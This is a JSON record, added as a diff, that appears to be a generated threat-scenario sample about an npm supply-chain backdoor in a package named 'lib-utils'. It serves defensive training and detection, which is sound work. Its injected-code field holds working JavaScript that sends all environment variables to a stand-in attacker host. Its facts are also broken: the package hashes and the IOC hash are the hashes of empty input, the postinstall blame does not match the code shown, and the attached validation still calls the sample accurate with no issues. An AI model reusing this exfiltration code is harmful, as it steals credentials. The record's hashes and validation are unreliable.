@@ -1,0 +1,102 @@
+{
+  "report": [
+    {
+      "index": 0,
+      "problem": {
+        "area": "Supply Chain",
+        "nature": "third_party_compromise"
+      },
+      "example": {
+        "scenario": "Compromise of a widely-used open-source JavaScript library by injecting a malicious backdoor in the published NPM package, which then exfiltrates environment variables and authentication tokens from downstream applications that import the compromised version.",
+        "technical_data": {
+          "npm_package_integrity": {
+            "package_name": "lib-utils",
+            "version": "3.2.1",
+            "published_time": "2024-05-12T14:22:10Z",
+            "sha512": "zKx+P9H5NQbBz+OM+FqL6KDxM7mq3JmJHwH+Y0u+4Jv1h6QX3zF7M9V7Z7i1e6t9n4XfGzY7vRWy0uM+F6x4B7Q==",
+            "package_json": {
+              "name": "lib-utils",
+              "version": "3.2.1",
+              "main": "index.js",
+              "scripts": {
+                "postinstall": "node scripts/postinstall.js"
+              },
+              "dependencies": {}
+            }
+          },
+          "malicious_code_snippet": {
+            "file": "index.js",
+            "injected_code": "const http = require('http');\nconst originalFunction = module.exports.someUtilityFunction;\n\nmodule.exports.someUtilityFunction = function() {\n  const envData = JSON.stringify(process.env);\n  const options = {\n    hostname: 'malicious-supplier.example.com',\n    port: 80,\n    path: '/exfiltrate',\n    method: 'POST',\n    headers: {\n      'Content-Type': 'application/json',\n      'Content-Length': Buffer.byteLength(envData)\n    }\n  };\n\n  const req = http.request(options);\n  req.on('error', () => {});\n  req.write(envData);\n  req.end();\n\n  return originalFunction.apply(this, arguments);\n};"
+          },
+          "network_traffic_capture": {
+            "timestamp": "2024-05-15T09:43:22.345Z",
+            "tcp_stream": [
+              "POST /exfiltrate HTTP/1.1",
+              "Host: malicious-supplier.example.com",
+              "Content-Type: application/json",
+              "Content-Length: 468",
+              "User-Agent: Node.js/16.13.0",
+              "",
+              "{\"PATH\":\"/usr/local/bin:/usr/bin\",\"NODE_ENV\":\"production\",\"API_TOKEN\":\"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.sensitivepart.signature\"}"
+            ]
+          },
+          "web_server_logs": {
+            "malicious_server_access_log": [
+              "192.0.2.55 - - [15/May/2024:09:43:22 +0000] \"POST /exfiltrate HTTP/1.1\" 200 2 \"-\" \"Node.js/16.13.0\"",
+              "192.0.2.55 - - [15/May/2024:09:45:10 +0000] \"POST /exfiltrate HTTP/1.1\" 200 2 \"-\" \"Node.js/16.13.0\""
+            ]
+          },
+          "downstream_application_logs": {
+            "node_app_error_log": [
+              "2024-05-15T09:43:22.340Z warn: HTTP POST to suspicious endpoint 'http://malicious-supplier.example.com/exfiltrate' detected in module 'lib-utils'",
+              "2024-05-15T09:43:22.341Z info: Overriding utility function 'someUtilityFunction' in 'lib-utils' detected."
+            ]
+          },
+          "sbom_fragment": {
+            "component": "lib-utils",
+            "version": "3.2.1",
+            "hashes": {
+              "md5": "d41d8cd98f00b204e9800998ecf8427e",
+              "sha1": "da39a3ee5e6b4b0d3255bfef95601890afd80709",
+              "sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
+            },
+            "integrity_check": "FAILED - injected postinstall script and network exfiltration code detected"
+          }
+        },
+        "indicators": {
+          "ioc_domains": [
+            "malicious-supplier.example.com"
+          ],
+          "ioc_ips": [
+            "192.0.2.55"
+          ],
+          "ioc_hashes": [
+            "d41d8cd98f00b204e9800998ecf8427e"
+          ],
+          "network_connections": [
+            "POST http://malicious-supplier.example.com/exfiltrate"
+          ],
+          "process_behavior": [
+            "postinstall script launching HTTP POST requests to unknown domains"
+          ],
+          "package_anomalies": [
+            "postinstall hook added unexpectedly",
+            "exported function overridden to exfiltrate environment variables"
+          ]
+        },
+        "detection_method": "Monitor NPM package updates with SBOM verification and code diff scanning; alert on unexpected postinstall scripts and outbound HTTP connections to unknown domains from server-side JavaScript runtime environments; IDS/IPS detecting POST requests with JSON payloads containing environment variables; heuristic analysis of package exports overriding original functions.",
+        "relevant_mitre_techniques": [
+          "T1195.001 - Supply Chain Compromise: Compromise Software Supply Chain",
+          "T1071.001 - Application Layer Protocol: Web Protocols",
+          "T1552.001 - Unsecured Credentials: Credentials in Files",
+          "T1608.002 - Stage Capabilities: Develop Malicious Software"
+        ]
+      },
+      "validation": {
+        "valid": true,
+        "issues": [],
+        "comments": "The sample accurately represents a third-party compromise in the supply chain by describing the injection of malicious code into a widely-used open-source JavaScript library's NPM package. The scenario is realistic and plausible, reflecting real-world supply chain attacks where attackers inject backdoors to exfiltrate sensitive data from downstream applications. All required fields are present and well-populated, including detailed technical data such as package integrity, malicious code snippet, network traffic capture, server logs, downstream application logs, and SBOM fragment with integrity check results. The indicators section clearly links observable artifacts (malicious domain, IP, hashes, network connections, anomalous process behavior, and package anomalies) to the compromise, supporting detection and response. The detection method is comprehensive and aligned with recommended risk reduction strategies. Relevant MITRE ATT&CK techniques are correctly identified, enhancing the sample's completeness and utility. Overall, this sample is thorough, coherent, and well-structured for illustrating a third-party compromise in the software supply chain."
+      }
+    }
+  ]
+}
